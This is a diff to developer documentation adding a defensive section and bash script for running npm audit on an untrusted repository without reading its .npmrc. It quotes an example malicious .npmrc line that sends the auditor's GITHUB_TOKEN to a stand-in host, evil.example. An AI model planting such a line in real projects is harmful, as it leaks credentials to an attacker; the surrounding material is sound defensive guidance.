@@ -526,6 +526,51 @@ npm run build
 
 **Caution:** Overrides force version resolution across the entire dependency tree. Always verify that the overridden version is API-compatible with consumers. Major version overrides (e.g., 6.x to 7.x) may cause runtime issues.
 
+### Running npm audit on a repository you do not trust
+
+`npm audit` run inside the audited repository reads that repository's `.npmrc`. A line such as `//evil.example/:_authToken=${GITHUB_TOKEN}` with `registry=https://evil.example/` makes npm send the auditor's environment variable to that host (GHSA-c8vv-4wxp-67cc). Run it on a copy instead. Save this as its own script and call it with the path of the audited repository; it prints the number of known vulnerabilities, or exits non-zero when it could not check:
+
+```bash
+#!/usr/bin/env bash
+set -u
+PROJECT_DIR="${1:?usage: npm-audit-copy.sh <path of the audited repository>}"
+AUDIT_DIR=$(mktemp -d)
+trap 'rm -rf "$AUDIT_DIR"' EXIT
+for f in package.json package-lock.json npm-shrinkwrap.json; do
+    if [[ -f "$PROJECT_DIR/$f" ]]; then cp "$PROJECT_DIR/$f" "$AUDIT_DIR/"; fi
+done
+GLOBALCONFIG=$(cd / && npm config get globalconfig 2>/dev/null) || GLOBALCONFIG=""
+if [[ "$GLOBALCONFIG" != /* || "$GLOBALCONFIG" == *$'\n'* ]]; then
+    echo "could not check: npm's globalconfig is unreadable" >&2; exit 2
+fi
+OUT=$(cd "$AUDIT_DIR" && npm audit --json --prefix "$AUDIT_DIR" --globalconfig "$GLOBALCONFIG" 2>/dev/null)
+RC=$?
+TOTAL=$(printf '%s' "$OUT" | node -e '
+    let s = ""; process.stdin.on("data", (d) => (s += d)).on("end", () => {
+        try { const t = JSON.parse(s).metadata.vulnerabilities.total;
+              if (Number.isInteger(t)) console.log(t); } catch {}
+    });')
+if [[ -z "$TOTAL" || ( "$TOTAL" == 0 && "$RC" -ne 0 ) ]]; then
+    echo "could not check: npm audit exit $RC" >&2; printf '%s\n' "$OUT" | head -10 >&2; exit 2
+fi
+echo "$TOTAL"
+```
+
+Each part closes a trap that a simpler version falls into:
+
+| Part | Without it |
+|---|---|
+| Copy into an empty directory | npm reads the project's `.npmrc`. |
+| `--prefix "$AUDIT_DIR"` | npm walks up from the copy; a `package.json` with `workspaces` and an `.npmrc` planted in a shared `/tmp` become its root and config. |
+| `--globalconfig` | `--prefix` also moves the default global config to `<prefix>/etc/npmrc`, so a registry, proxy or CA set there is silently ignored. |
+| Not `--no-workspaces` | It stops the walk too, but drops every dependency only a workspace needs as soon as the root has one of its own. |
+| Copy `npm-shrinkwrap.json` | npm prefers it over `package-lock.json`; without it the copy audits other versions. |
+| Read `npm config get` from stdout only and accept one absolute path | npm writes warnings (`Unknown user config`) on stderr, and refuses with exit 1 to print a path that contains a UUID-shaped segment. Either way `--globalconfig` would name no real file. |
+| `2>/dev/null` on `npm audit` | The same warnings land in front of the JSON, and the parse fails. |
+| Read `metadata.vulnerabilities.total` | Every report contains the key `"vulnerabilities"`, so searching for it reports a finding on every run. `npm audit` exits 1 both for findings and for errors, so the exit code alone cannot tell them apart. |
+
+The repository's scanner `skills/security-audit/scripts/scanners/javascript.sh` implements the same steps, and `scripts/test_audit_scripts.py` (both paths from the repository root; classes `NpmAuditTest` and `NpmAuditRegistryTest`) tests each part against the real npm.
+
 ### Dependabot / Renovate for Automated Updates
 
 **Dependabot configuration:**
